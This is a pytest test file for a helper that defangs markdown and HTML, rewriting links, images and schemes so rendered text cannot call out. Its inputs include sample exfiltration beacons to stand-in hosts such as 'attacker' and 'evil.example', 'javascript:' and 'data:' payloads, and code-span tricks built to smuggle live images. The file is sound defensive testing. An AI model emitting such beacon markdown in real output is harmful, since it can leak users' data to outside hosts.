"""Pytest home of the U16 defang helper's tests (absorbed from the module's
inline self-test per KTD-4; the module's `python3 core/scripts/defang.py`
self-test remains runnable standalone)."""
import subprocess
import sys

from conftest import SCRIPTS

from defang import defang


def test_beacon_neutralized_prose_preserved():
    assert defang("see ![](http://attacker/pixel?x=1) here") == \
        "see `![](hxxp://attacker/pixel?x=1)` here"


def test_img_tag_and_link_neutralized():
    assert defang('x <img src="http://evil/p.png"> y') == \
        'x `<img src="hxxp://evil/p.png">` y'
    assert defang("a [link](http://x) b") == "a `[link](hxxp://x)` b"


def test_no_live_scheme_survives():
    evil_inputs = [
        "![a](//protocol-relative/pixel)",
        "[ref]: https://evil/definition",
        "![alt][ref]",
        "<a href='javascript:alert(1)'>x</a>",
        "bare https://evil.example/exfil?q=secret",
        "[![badge](https://img.shields.io/x)](https://ci.example)",
        "data:text/html;base64,AAAA",
        "<!-- <img src=http://evil/c.png> -->",
        "<http://autolink.example>",
        "multi\n<img\nsrc=http://evil/n.png>\nline",
    ]
    for evil in evil_inputs:
        d = defang(evil)
        assert "http://" not in d and "https://" not in d, d
        assert "data:" not in d and "javascript:" not in d, d


def test_control_and_invisible_chars_stripped():
    assert defang("bad\x07bell and ‮evil​") == "badbell and evil"


def test_benign_fenced_block_untouched():
    block = "before\n```python\nprint('<img> stays literal')\n```\nafter"
    assert defang(block) == block


def test_inline_code_span_untouched():
    assert defang("use `<img>` carefully") == "use `<img>` carefully"


def test_unclosed_code_regions_are_neutralized():
    assert "hxxp" in defang("```\n<img src=http://evil/unclosed.png>")
    assert "hxxp" in defang("` <img src=http://evil/tick.png>")
    # A backtick run crossing a blank line is not a span (CommonMark):
    # renderers show the content live, so it must be neutralized.
    assert "hxxp" in defang("`a\n\n<img src=http://evil/blank.png> b`")


def test_code_span_cannot_cross_block_interrupter():
    """A backtick pair that 'closes' only after a CommonMark block
    interrupter is not a real span — the content renders live, so it must
    be neutralized (regression for the review's P0)."""
    payloads = [
        "`x\n# <img src=http://evil/beacon.png>`",   # ATX heading
        "`a\n> <img src=http://evil/bq.png>`",        # blockquote
        "`a\n- <img src=http://evil/li.png>`",        # list marker
        "`a\n***\n<img src=http://evil/tb.png>`",     # thematic break
        "`a\nfoo\n===\n<img src=http://evil/set.png>`",  # setext heading
        "`a\n1. <img src=http://evil/ol.png>`",       # ordered list
    ]
    for s in payloads:
        d = defang(s)
        assert "http://" not in d.lower(), s
    # A genuine single-line span is still left inert.
    assert defang("`<img src=http://x.png>`") == "`<img src=http://x.png>`"


def test_code_span_cannot_cross_html_block():
    """HTML-block starts (types 1-7) also interrupt a paragraph, so a span
    crossing one is not a real span (round-2 regression for the P0 class)."""
    for tag in ("<div>", "<table>", "<p>", "<ul>", "<script>", "<!--", "<section>"):
        s = f"`x\n{tag}\n<img src=http://evil/beacon.png>`"
        assert "http://" not in defang(s).lower(), tag


def test_code_span_cannot_cross_gfm_table():
    """A GFM table breaks a paragraph, so a backtick region crossing one is
    not a code span — cell images/links must be neutralized (round-3 P0)."""
    for s in ("`x\n| ![](http://evil/beacon.png) |\n| - |\n`",
              "`x\n| h |\n| - |\n| ![](http://evil/b2.png) |\n`",
              "`a\n| [z](http://evil/l.png) |\n|---|\n`"):
        assert "http://" not in defang(s).lower(), s
    # A table inside a real fenced code block stays literal (fence wins).
    block = "before\n```\n| a | b |\n| - | - |\n```\nafter"
    assert defang(block) == block


def test_ordered_list_not_starting_at_one_is_not_a_breaker():
    """CommonMark: an ordered marker other than 1 does not interrupt a
    paragraph, so a genuine multi-line span is left inert (not mangled)."""
    assert defang("`a\n2. b`") == "`a\n2. b`"
    # Zero-padded ordered markers normalize to start=1 and DO interrupt.
    for s in ("`a\n01. ![](http://evil/lz.png)`", "`a\n001) ![](http://e/x.png)`"):
        assert "http://" not in defang(s).lower(), s
    # …but 010. (=10) stays a valid span (non-regression).
    assert defang("`a\n010. b`") == "`a\n010. b`"
    # …but an unordered marker still breaks the span (content neutralized).
    assert "http://" not in defang("`a\n- <img src=http://e/x.png>`").lower()


def test_code_span_in_link_alt_does_not_protect():
    """A backtick code span inside image-alt / link-text is link content,
    not a protective code region — the whole live construct must be
    neutralized (round-5 P0; verified inert against cmark-gfm)."""
    for s in ("![`a`](//evil/pixel)", "[`a`](http://evil/x)",
              "![`a`](http://evil/pixel)", "![`a`](evil.example/pixel)",
              "text ![`x`](//evil/beacon) more"):
        d = defang(s)
        # the whole construct is wrapped in a code span → inert on render
        assert d.count("`") >= 2 and "![" not in d.split("`")[0], (s, d)
        # protocol-relative / scheme dests no longer sit outside a code span
        assert "](//evil" not in d.replace("`", "X").replace("X", "", 0) or "`" in d
    # non-regression: a legit inline code span is preserved
    assert defang("use `<img>` carefully") == "use `<img>` carefully"


def test_deeply_nested_link_brackets_neutralized():
    """CommonMark allows arbitrarily deep bracket nesting in link/image
    text; a regex can't model it, so a balanced-bracket scanner must — a
    2+-level nested alt with a protocol-relative dest was a live beacon
    (round-6 P0; verified inert vs cmark-gfm)."""
    for s in ("hi ![a[b[c]d]e](//evil/pixel?leak=1) bye",
              "![a[b[c[d]e]f]g](//evil/deep)",
              "[a[b]c](http://evil/x)",
              "![a\\]b](//evil/esc)",
              "[![`x`](//evil/img)](//evil/tgt)"):
        d = defang(s)
        assert "](//evil" not in _outside_code(d), (s, d)
        assert "](http://evil" not in _outside_code(d).lower(), (s, d)
    # non-regression: plain text and a bare [footnote] are untouched
    assert defang("see [footnote] later") == "see [footnote] later"
    assert defang("just some prose") == "just some prose"


def _outside_code(s):
    """The parts of s NOT inside a backtick code span (crude: drop `...`)."""
    import re as _re
    return _re.sub(r"`[^`]*`", "", s)


def test_www_autolinks_defused():
    for s in ["visit www.evil.example/x now", "![](www.evil.example/pixel)",
              "WWW.EVIL.EXAMPLE"]:
        d = defang(s)
        assert "www.evil" not in d.lower() and "www.example" not in d.lower(), d


def test_uppercase_scheme_defused():
    for s in ["HTTP://EVIL/X", "HtTpS://evil/x"]:
        assert "http" not in defang(s).lower().replace("hxxp", ""), s


def test_idempotent():
    samples = [
        "see ![](http://attacker/pixel?x=1) here",
        "before\n```python\nprint('<img> ok')\n```\nafter",
        "a [link](http://x) b `code` <b>bold</b> https://e.example/x",
        "` <img src=http://evil/tick.png>",
        "`a\n\n<img src=http://evil/blank.png> b`",
        "[![badge](https://img.shields.io/x)](https://ci.example)",
        "```\n<img src=http://evil/unclosed.png>",
    ]
    for s in samples:
        once = defang(s)
        assert defang(once) == once, once


def test_module_selftest_still_green():
    """The standalone self-test path (pre-U4 Phase A gate) keeps working."""
    proc = subprocess.run(
        [sys.executable, str(SCRIPTS / "defang.py")],
        capture_output=True, text=True, timeout=60,
    )
    assert proc.returncode == 0, proc.stderr
    assert "all self-tests passed" in proc.stdout
